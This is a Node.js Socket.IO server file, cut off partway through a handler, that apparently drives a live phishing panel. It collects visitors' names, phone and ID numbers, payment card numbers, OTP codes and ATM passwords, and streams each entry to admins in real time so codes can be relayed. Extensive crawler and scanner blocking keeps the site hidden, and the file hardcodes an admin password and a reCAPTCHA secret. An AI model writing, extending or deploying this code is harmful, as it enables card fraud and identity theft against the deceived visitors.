const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
const server = http.createServer(app);

// CORS Configuration - Allow multiple origins
const allowedOrigins = [
  process.env.CLIENT_URL,
  "https://becarensa-mk5dxhbq.manus.space",
  "https://becarenasor-gilt.vercel.app",
].filter(Boolean);

const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (same-origin, server-to-server)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.log(`[CORS BLOCKED] Origin: ${origin}`);
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
};

app.use(cors(corsOptions));
app.use(express.json({ limit: '1mb' })); // Limit body size
app.use(cookieParser());

// ===== BOT DETECTION FUNCTIONS (defined early for middleware use) =====

// Check if user agent is a bot or crawler - COMPREHENSIVE BLOCKING
function isBot(ua) {
  if (!ua || ua.length < 10) return true; // Empty or very short UA = suspicious
  const lowerUA = ua.toLowerCase();
  const botPatterns = [
    // Search engine bots
    'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot',
    'slurp', 'sogou', 'exabot', 'facebot', 'ia_archiver',
    // Crawlers & scrapers
    'crawler', 'spider', 'scraper', 'bot/', 'bot;', 'bot ',
    'crawl', 'fetch', 'archive', 'scan',
    // Automation tools
    'phantomjs', 'headless', 'selenium', 'puppeteer', 'playwright',
    'webdriver', 'chromedriver', 'geckodriver', 'nightwatch',
    'cypress', 'casperjs', 'slimerjs', 'zombie',
    // HTTP libraries
    'python-requests', 'python-urllib', 'python/', 'aiohttp',
    'httpx', 'scrapy', 'beautifulsoup',
    'curl/', 'wget/', 'libwww', 'lwp-',
    'java/', 'apache-httpclient', 'okhttp',
    'node-fetch', 'axios/', 'got/',
    'go-http-client', 'ruby', 'perl',
    'postman', 'insomnia', 'httpie',
    // Known bad bots
    'semrush', 'ahrefs', 'mj12bot', 'dotbot', 'rogerbot',
    'screaming frog', 'seokicks', 'sistrix', 'linkdex',
    'blexbot', 'megaindex', 'majestic', 'serpstat',
    'petalbot', 'bytespider', 'gptbot', 'ccbot', 'chatgpt',
    'claudebot', 'anthropic', 'cohere-ai',
    // Misc
    'feedfetcher', 'mediapartners', 'adsbot', 'apis-google',
    'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom',
    'uptimerobot', 'statuscake', 'monitor', 'checker',
    'validator', 'w3c', 'whatsapp', 'telegram', 'discord',
    'slack', 'facebook', 'twitter', 'linkedin',
    'preview', 'embed', 'proxy', 'anonymo',
  ];
  return botPatterns.some(pattern => lowerUA.includes(pattern));
}

// Visitor validation - check for real browser signatures
function isValidVisitor(ua) {
  if (!ua || ua.length < 20) return false;
  const lowerUA = ua.toLowerCase();
  // Must contain at least one real browser identifier
  const browserSignatures = ['mozilla/', 'chrome/', 'safari/', 'firefox/', 'edge/', 'opera/', 'opr/'];
  const hasBrowser = browserSignatures.some(sig => lowerUA.includes(sig));
  if (!hasBrowser) return false;
  // Must not be a known bot
  if (isBot(ua)) return false;
  return true;
}

// Security headers (like Helmet)
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.removeHeader('X-Powered-By');
  next();
});

// Bot detection middleware for HTTP requests
app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  if (isBot(ua)) {
    console.log(`[BOT BLOCKED] HTTP: ${req.ip}, UA: ${ua.substring(0, 80)}`);
    return res.status(403).json({ error: 'Access denied' });
  }
  next();
});

// Rate Limiting - block IPs with too many requests
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 30; // max requests per window (reduced from 100)
const RATE_LIMIT_BLOCK_DURATION = 30 * 60 * 1000; // block for 30 minutes (increased from 10)

// Socket connection rate limiting per IP
const socketRateLimitMap = new Map();
const SOCKET_RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const SOCKET_MAX_CONNECTIONS = 5; // max socket connections per IP per minute
const SOCKET_BLOCK_DURATION = 60 * 60 * 1000; // block for 1 hour

// Suspicious behavior tracking
const suspiciousIPs = new Map();
const SUSPICIOUS_THRESHOLD = 3; // strikes before permanent block
const SUSPICIOUS_BLOCK_DURATION = 24 * 60 * 60 * 1000; // 24 hours

setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of rateLimitMap) {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW && !data.blocked) {
      rateLimitMap.delete(ip);
    }
    if (data.blocked && now > data.blockedUntil) {
      rateLimitMap.delete(ip);
    }
  }
  // Clean up socket rate limit map
  for (const [ip, data] of socketRateLimitMap) {
    if (data.blocked && now > data.blockedUntil) {
      socketRateLimitMap.delete(ip);
    } else if (!data.blocked && now - data.firstConnection > SOCKET_RATE_LIMIT_WINDOW) {
      socketRateLimitMap.delete(ip);
    }
  }
  // Clean up suspicious IPs
  for (const [ip, data] of suspiciousIPs) {
    if (data.blocked && now > data.blockedUntil) {
      suspiciousIPs.delete(ip);
    }
  }
}, 60 * 1000);

app.use((req, res, next) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  const now = Date.now();
  let data = rateLimitMap.get(ip);
  
  if (data && data.blocked) {
    if (now < data.blockedUntil) {
      return res.status(429).send('Too many requests. Try again later.');
    } else {
      rateLimitMap.delete(ip);
      data = null;
    }
  }
  
  if (!data) {
    rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
  } else {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW) {
      rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
    } else {
      data.count++;
      if (data.count > RATE_LIMIT_MAX) {
        data.blocked = true;
        data.blockedUntil = now + RATE_LIMIT_BLOCK_DURATION;
        return res.status(429).send('Too many requests. Try again later.');
      }
    }
  }
  next();
});

// Protect admin panel with IP logging
app.use('/admin', (req, res, next) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  console.log(`[ADMIN ACCESS] IP: ${ip}, Path: ${req.path}`);
  next();
}, express.static('admin'));

// API endpoint protection - require valid Origin for API calls
app.use('/api', (req, res, next) => {
  const origin = req.headers['origin'] || '';
  const referer = req.headers['referer'] || '';
  // Allow if origin matches OR referer contains allowed domain OR no origin (server-to-server)
  const isAllowedOrigin = !origin || allowedOrigins.includes(origin);
  const isAllowedReferer = !referer || allowedOrigins.some(o => referer.startsWith(o));
  if (!isAllowedOrigin && !isAllowedReferer) {
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
    console.log(`[API BLOCKED] Bad origin/referer. IP: ${ip}, Origin: ${origin}, Referer: ${referer}`);
    return res.status(403).json({ error: 'Access denied' });
  }
  next();
});

// Socket.IO Configuration with enhanced security
const io = new Server(server, {
  cors: corsOptions,
  transports: ["websocket", "polling"],
  pingTimeout: 30000,
  pingInterval: 25000,
  maxHttpBufferSize: 1e6, // 1MB max message size
});

// ===== ADVANCED BOT PROTECTION LAYER =====

// Track connection attempts per IP for socket flood protection
function checkSocketRateLimit(ip) {
  const now = Date.now();
  let data = socketRateLimitMap.get(ip);
  
  // Check if IP is blocked
  if (data && data.blocked) {
    if (now < data.blockedUntil) return false;
    socketRateLimitMap.delete(ip);
    data = null;
  }
  
  if (!data) {
    socketRateLimitMap.set(ip, { count: 1, firstConnection: now, blocked: false });
    return true;
  }
  
  if (now - data.firstConnection > SOCKET_RATE_LIMIT_WINDOW) {
    socketRateLimitMap.set(ip, { count: 1, firstConnection: now, blocked: false });
    return true;
  }
  
  data.count++;
  if (data.count > SOCKET_MAX_CONNECTIONS) {
    data.blocked = true;
    data.blockedUntil = now + SOCKET_BLOCK_DURATION;
    markSuspicious(ip, 'socket_flood');
    console.log(`[SOCKET FLOOD] IP blocked: ${ip} (${data.count} connections in ${SOCKET_RATE_LIMIT_WINDOW/1000}s)`);
    return false;
  }
  return true;
}

// Track suspicious behavior
function markSuspicious(ip, reason) {
  const now = Date.now();
  let data = suspiciousIPs.get(ip);
  if (!data) {
    data = { strikes: 0, reasons: [], firstStrike: now, blocked: false };
    suspiciousIPs.set(ip, data);
  }
  data.strikes++;
  data.reasons.push({ reason, time: new Date().toISOString() });
  if (data.strikes >= SUSPICIOUS_THRESHOLD) {
    data.blocked = true;
    data.blockedUntil = now + SUSPICIOUS_BLOCK_DURATION;
    console.log(`[SUSPICIOUS BLOCKED] IP: ${ip}, strikes: ${data.strikes}, reasons: ${data.reasons.map(r => r.reason).join(', ')}`);
  }
}

// Check if IP is suspicious-blocked
function isSuspiciousBlocked(ip) {
  const data = suspiciousIPs.get(ip);
  if (!data || !data.blocked) return false;
  if (Date.now() > data.blockedUntil) {
    suspiciousIPs.delete(ip);
    return false;
  }
  return true;
}

// Advanced browser fingerprint validation
function validateHandshake(socket) {
  const headers = socket.handshake.headers;
  const ua = headers['user-agent'] || '';
  
  // 1. Must have a valid User-Agent
  if (!ua || ua.length < 20) return { valid: false, reason: 'missing_ua' };
  
  // 2. Must not be a known bot
  if (isBot(ua)) return { valid: false, reason: 'bot_ua' };
  
  // 3. Must have browser-like headers
  if (!isValidVisitor(ua)) return { valid: false, reason: 'invalid_browser' };
  
  // 4. Check for automation markers in headers
  // Headless browsers often miss Accept-Language
  if (!headers['accept-language']) {
    return { valid: false, reason: 'no_accept_language' };
  }
  
  // 5. Check Origin header matches allowed origins
  const origin = headers['origin'] || '';
  if (origin && !allowedOrigins.includes(origin)) {
    return { valid: false, reason: 'bad_origin' };
  }
  
  return { valid: true };
}

// Proof-of-Work challenge for socket connections
// Real browsers solve it instantly, bots struggle or skip
const pendingChallenges = new Map();
const CHALLENGE_TIMEOUT = 15000; // 15 seconds to solve

function generateChallenge() {
  const prefix = Math.random().toString(36).substring(2, 8);
  const difficulty = 3; // Number of leading zeros required
  return { prefix, difficulty, timestamp: Date.now() };
}

function verifyChallenge(challenge, answer) {
  if (!challenge || !answer) return false;
  if (Date.now() - challenge.timestamp > CHALLENGE_TIMEOUT) return false;
  // Simple hash verification - the answer combined with prefix should produce leading zeros
  const combined = challenge.prefix + answer;
  let hash = 0;
  for (let i = 0; i < combined.length; i++) {
    const char = combined.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  const hashStr = Math.abs(hash).toString(16);
  return hashStr.startsWith('0'.repeat(challenge.difficulty));
}

// Socket.IO middleware - runs BEFORE connection event
io.use((socket, next) => {
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const ua = socket.handshake.headers['user-agent'] || '';
  
  // 1. Check if IP is permanently blocked
  if (isSuspiciousBlocked(ip)) {
    console.log(`[BLOCKED] Suspicious IP rejected: ${ip}`);
    return next(new Error('Access denied'));
  }
  
  // 2. Check socket rate limit
  if (!checkSocketRateLimit(ip)) {
    console.log(`[RATE LIMITED] Socket connection rejected: ${ip}`);
    return next(new Error('Too many connections'));
  }
  
  // 3. Validate handshake (browser fingerprint)
  const validation = validateHandshake(socket);
  if (!validation.valid) {
    console.log(`[HANDSHAKE FAILED] IP: ${ip}, reason: ${validation.reason}, UA: ${ua.substring(0, 60)}`);
    markSuspicious(ip, validation.reason);
    return next(new Error('Invalid connection'));
  }
  
  // 4. Check for rapid reconnection (bot behavior)
  const lastDisconnect = socket.handshake.auth?.lastDisconnect;
  if (lastDisconnect && (Date.now() - lastDisconnect) < 1000) {
    markSuspicious(ip, 'rapid_reconnect');
  }
  
  console.log(`[ALLOWED] Connection from: ${ip}, UA: ${ua.substring(0, 40)}...`);
  next();
});

// Event rate limiting per socket
const socketEventCounters = new Map();
const EVENT_RATE_LIMIT = 30; // max events per 10 seconds
const EVENT_RATE_WINDOW = 10000; // 10 seconds

function checkEventRateLimit(socketId) {
  const now = Date.now();
  let data = socketEventCounters.get(socketId);
  if (!data) {
    data = { count: 1, windowStart: now };
    socketEventCounters.set(socketId, data);
    return true;
  }
  if (now - data.windowStart > EVENT_RATE_WINDOW) {
    data.count = 1;
    data.windowStart = now;
    return true;
  }
  data.count++;
  return data.count <= EVENT_RATE_LIMIT;
}

// Clean up event counters when socket disconnects
io.on('connection', (socket) => {
  socket.on('disconnect', () => {
    socketEventCounters.delete(socket.id);
  });
});

// ===== END ADVANCED BOT PROTECTION LAYER =====

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "adnanRAFEEF@600",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "adnanRAFEEF@600",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "adnanRAFEEF@600",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "adnanRAFEEF@600",
  };
}

// Save data to file with backup
function saveData() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "adnanRAFEEF@600"; // Admin password (persisted)

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the last IP from x-forwarded-for (the external/public IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1]; // Use the last IP (external)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Wrap all event handlers with rate limiting
  const originalOn = socket.on.bind(socket);
  socket.on = function(event, handler) {
    if (['disconnect', 'error', 'connect'].includes(event)) {
      return originalOn(event, handler);
    }
    return originalOn(event, (...args) => {
      if (!checkEventRateLimit(socket.id)) {
        const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
        console.log(`[EVENT FLOOD] Socket ${socket.id} IP: ${ip}, event: ${event}`);
        markSuspicious(ip, 'event_flood');
        socket.disconnect();
        return;
      }
      handler(...args);
    });
  };

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
    const visitorInfo = getVisitorInfo(socket);
    
    // Block bots and unknown visitors
    if (!isValidVisitor(visitorInfo.userAgent)) {
      console.log(`Blocked bot/unknown visitor: ${visitorInfo.ip}, UA: ${visitorInfo.userAgent}`);
      socket.disconnect();
      return;
    }
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });
    // If visitor was blocked, re-send blocked event
    if (visitor.isBlocked) {
      socket.emit("blocked");
    }

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
      });
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", async (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;

      // ===== reCAPTCHA v3 + ShieldToken Verification (Smart - won't block real users) =====
      const recaptchaToken = data.recaptchaToken;
      const shieldToken = data.shieldToken;
      const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
      let suspicionLevel = 0; // Track how suspicious this request is

      // Verify ShieldToken format (base64 reversed, contains expected fields)
      if (shieldToken) {
        try {
          const decoded = atob(shieldToken.split('').reverse().join(''));
          const parts = decoded.split('|');
          // Token should have: fingerprint|timestamp|screenInfo|timezone|lang|platform|humanScore
          if (parts.length < 7) {
            console.log(`[SHIELD] Invalid token format from IP: ${ip}, parts: ${parts.length}`);
            suspicionLevel += 2; // Strong signal
          } else {
            const humanScore = parseInt(parts[6]) || 0;
            console.log(`[SHIELD] Human score: ${humanScore} from IP: ${ip}`);
            if (humanScore < 10) {
              suspicionLevel += 2; // Very low score = very suspicious
            } else if (humanScore < 20) {
              suspicionLevel += 1; // Low score = somewhat suspicious
            }
            // Score >= 20 = OK, no suspicion added
          }
        } catch (e) {
          console.log(`[SHIELD] Failed to decode token from IP: ${ip}`);
          suspicionLevel += 2; // Malformed token = suspicious
        }
      } else {
        // No shield token - could be first load or slow connection, just log it
        console.log(`[SHIELD] No shield token from IP: ${ip} (may be first load)`);
        suspicionLevel += 0.5; // Mild suspicion - real users may not have it on first request
      }

      // Verify reCAPTCHA v3 token with Google
      if (recaptchaToken) {
        try {
          const recaptchaSecret = process.env.RECAPTCHA_SECRET_KEY || '6LdtFpksAAAAABufpUvakaicChTWskwLKNGw8KBX';
          const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${recaptchaSecret}&response=${recaptchaToken}&remoteip=${ip}`;
          const response = await fetch(verifyUrl, { method: 'POST' });
          const result = await response.json();
          
          if (!result.success) {
            console.log(`[reCAPTCHA] Verification failed from IP: ${ip}, errors: ${JSON.stringify(result['error-codes'])}`);
            suspicionLevel += 2;
          } else if (result.score < 0.3) {
            console.log(`[reCAPTCHA] Low score: ${result.score} from IP: ${ip}, action: ${result.action}`);
            suspicionLevel += 2;
          } else {
            console.log(`[reCAPTCHA] OK - score: ${result.score}, action: ${result.action}, IP: ${ip}`);
            // Good reCAPTCHA score reduces suspicion
            suspicionLevel = Math.max(0, suspicionLevel - 1);
          }
        } catch (e) {
          console.log(`[reCAPTCHA] Verification error: ${e.message}`);
          // Don't increase suspicion on verification errors - fail open
        }
      } else {
        // No reCAPTCHA token - could be script not loaded yet
        console.log(`[reCAPTCHA] No token from IP: ${ip} (script may not be loaded yet)`);
        suspicionLevel += 0.5; // Mild suspicion
      }

      // Only mark as suspicious if MULTIPLE strong signals detected (suspicionLevel >= 3)
      // This prevents blocking real users who just loaded the page
      if (suspicionLevel >= 3) {
        console.log(`[SUSPICIOUS] High suspicion level: ${suspicionLevel} from IP: ${ip}`);
        markSuspicious(ip, 'high_suspicion_more_info');
      }

      // Check if IP got blocked from accumulated suspicious activity
      if (isSuspiciousBlocked(ip)) {
        console.log(`[BLOCKED] IP ${ip} blocked after suspicious activity in more-info`);
        socket.disconnect(true);
        return;
      }
      // ===== END reCAPTCHA + ShieldToken Verification =====
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Update lastDataUpdate from SummaryPayment page onwards
        const paymentPages = ['الملخص والدفع', 'ملخص الدفع'];
        if (paymentPages.includes(data.page)) {
          visitor.hasEnteredPaymentFlow = true;
        }
        if (visitor.hasEnteredPaymentFlow || visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        // Check if card was previously rejected by admin
        const newCardNumber = data.paymentCard.cardNumber;
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber);
        
        if (isAdminRejected) {
          // Reject duplicate card - notify visitor
          socket.emit("card:duplicateRejected");
          // Reset waiting status since card was auto-rejected
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save duplicate card rejection permanently
          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
          visitor.duplicateCardRejections.push({ cardNumber: newCardNumber, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about duplicate card rejection
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateCard", {
              visitorId: visitor._id,
              cardNumber: newCardNumber,
              visitor: visitor,
            });
          });
          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
          return; // Don't continue processing - no waitingForAdminResponse, no dataSubmitted
        } else {
          const now = new Date().toISOString();
          visitor.paymentCards.push({
            ...data.paymentCard,
            timestamp: now,
          });
          // Start tracking from card page
          visitor.lastDataUpdate = now;
          visitor.hasEnteredCardPage = true;
        }
      }
      if (data.digitCode) {
        // Check for duplicate OTP code
        const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
        if (isDuplicateCode && data.page !== "كلمة مرور ATM") {
          // Reject duplicate OTP - notify visitor
          socket.emit("otp:duplicateRejected");
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save duplicate OTP rejection permanently
          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
          visitor.duplicateOtpRejections.push({ code: data.digitCode, page: data.page, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about duplicate OTP rejection
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateOtp", {
              visitorId: visitor._id,
              code: data.digitCode,
              page: data.page,
              visitor: visitor,
            });
          });
          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${data.digitCode}`);
          return;
        }
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Update if already entered payment flow or card page
        if (visitor.hasEnteredPaymentFlow || visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
